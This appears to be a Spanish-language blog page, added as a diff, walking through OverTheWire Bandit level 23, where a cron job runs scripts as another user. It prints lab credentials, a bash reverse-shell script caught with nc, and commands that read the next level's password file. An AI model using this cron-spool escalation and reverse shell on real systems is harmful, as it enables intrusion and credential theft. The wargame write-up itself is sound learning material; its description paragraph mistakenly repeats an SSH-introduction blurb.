@@ -1,0 +1,189 @@
+    <!DOCTYPE html>
+    <html lang="es">
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nivel 23 - Bandit Levels</title>
+    <link rel="stylesheet" href="../css/blog.css">
+    <link rel="shortcut icon" href="https://overthewire.org/img/favicon.ico" type="image/x-icon">
+    </head>
+    <body>
+<!-- Fondo de vídeo -->
+<div class="video-background">
+    <video autoplay muted loop id="bg-video">
+    <source src="https://cdn.pixabay.com/video/2020/04/18/36503-427607440_large.mp4" type="video/mp4">
+    Tu navegador no soporta la etiqueta de vídeo.
+    </video>
+</div>
+
+    <!-- Contenido principal -->
+    <div class="content">
+        <header>
+        <a href="../index.html" class="back-button">← Volver al Inicio</a>
+        <h1>Nivel 23</h1>
+        <p>Introducción a tareas Cron</p>
+        </header>
+
+        <main>
+        <section>
+            <h2>Descripción del Reto 💻</h2>
+            <p>
+            En este nivel, aprenderás a conectarte a un servidor remoto usando SSH. 
+            El objetivo es familiarizarte con el comando básico de conexión y explorar el entorno.
+            </p>
+        </section>
+        <section>
+            <h2>Información de Login 🔑</h2>
+            <ul class="login-info">
+            <li><strong>Username:</strong> bandit23</li>
+            <li><strong>Password:</strong> 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga</li>
+            <li><strong>Host:</strong> bandit.labs.overthewire.org</li>
+            <li><strong>Port:</strong> 2220</li>
+            </ul>
+        </section>
+
+        <section>
+            <h2>Pasos para Resolver el Nivel 🛠️</h2>
+            <ol>
+            <li>
+                <p>Conéctate al servidor usando SSH:</p>
+                <div class="terminal">
+                <div class="terminal-header">
+                    <div class="buttons">
+                    <span class="button red"></span>
+                    <span class="button yellow"></span>
+                    <span class="button green"></span>
+                    </div>
+                    <p class="title">bash</p>
+                </div>
+                <div class="terminal-body">
+                    <pre><code class="bash">
+$ ssh bandit23@bandit.labs.overthewire.org -p 2220
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit0@bandit.labs.overthewire.org's password:
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+                    </code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copiar ✅</button>
+                </div>
+                </div>
+            </li>
+            <li>
+                <p>Analizamos el cronjob para bandit24</p>
+                <div class="terminal">
+                <div class="terminal-header">
+                    <div class="buttons">
+                    <span class="button red"></span>
+                    <span class="button yellow"></span>
+                    <span class="button green"></span>
+                    </div>
+                    <p class="title">bash</p>
+                </div>
+                <div class="terminal-body">
+                    <pre><code class="bash">
+bandit23@bandit:~$ cd /etc/cron.d
+bandit23@bandit:/etc/cron.d$ ls
+cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  otw-tmp-dir  sysstat
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+bandit23@bandit:/etc/cron.d$mktemp -d
+/tmp/tmp.aA6EVNBWTr
+bandit23@bandit:/etc/cron.d$ cd /tmp/tmp.aA6EVNBWTr
+bandit23@bandit:/tmp/tmp.aA6EVNBWTr$ nano shell.sh
+                    </code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copiar ✅</button>
+                </div>
+                </div>
+            </li>
+            <li>
+                <p>Creamos un script</p>
+                <div class="terminal">
+                <div class="terminal-header">
+                    <div class="buttons">
+                    <span class="button red"></span>
+                    <span class="button yellow"></span>
+                    <span class="button green"></span>
+                    </div>
+                    <p class="title">bash</p>
+                </div>
+                <div class="terminal-body">
+                    <pre><code class="bash">
+GNU nano 7.2                             shell.sh *                                     
+#!/bin/bash
+
+bash -i >& /dev/tcp/localhost/1234 0>&1
+                    </code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copiar ✅</button>
+                </div>
+                </div>
+            </li>
+            <li>
+                <p>Nos entablamos reverse-shell con el script</p>
+                <div class="terminal">
+                <div class="terminal-header">
+                    <div class="buttons">
+                    <span class="button red"></span>
+                    <span class="button yellow"></span>
+                    <span class="button green"></span>
+                    </div>
+                    <p class="title">bash</p>
+                </div>
+                <div class="terminal-body">
+                    <pre><code class="bash">
+bandit23@bandit:/tmp/tmp.aA6EVNBWTr$ chmod +x shell.sh
+bandit23@bandit:/tmp/tmp.aA6EVNBWTr$ mv shell.sh /var/spool/
+bandit24/ cron/     mail/     rsyslog/  
+bandit23@bandit:/tmp/tmp.aA6EVNBWTr$ mv shell.sh /var/spool/bandit24/foo/
+bandit23@bandit:/tmp/tmp.aA6EVNBWTr$ nc -nlvp 1234
+Listening on 0.0.0.0 1234
+Connection received on 127.0.0.1 41962
+bash: cannot set terminal process group (3846742): Inappropriate ioctl for device
+bash: no job control in this shell
+/usr/bin/lesspipe: 1: Cannot fork
+bandit24@bandit:/var/spool/bandit24/foo$ whoami
+bandit24
+bandit24@bandit:/var/spool/bandit24/foo$ cat /etc/bandit_pass/bandit24
+cat /etc/bandit_pass/bandit24
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+bandit24@bandit:/var/spool/bandit24/foo$
+                    </code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copiar ✅</button>
+                </div>
+                </div>
+            </li>
+        </section>
+
+        <section>
+            <h2>Resultado Esperado 🎉</h2>
+            <p>
+            Sigue así y llegarás al final del juego. ¡Ánimo! 🚀
+            </p>
+        </section>
+        </main>
+
+        <footer>
+        <p>&copy; 2025 Bandit Levels - Desarrollado por Jordi Bravo Jorquera 🧑‍💻</p>
+        </footer>
+    </div>
+
+    <script src="../js/scripts.js"></script>
+    </body>
+    </html>
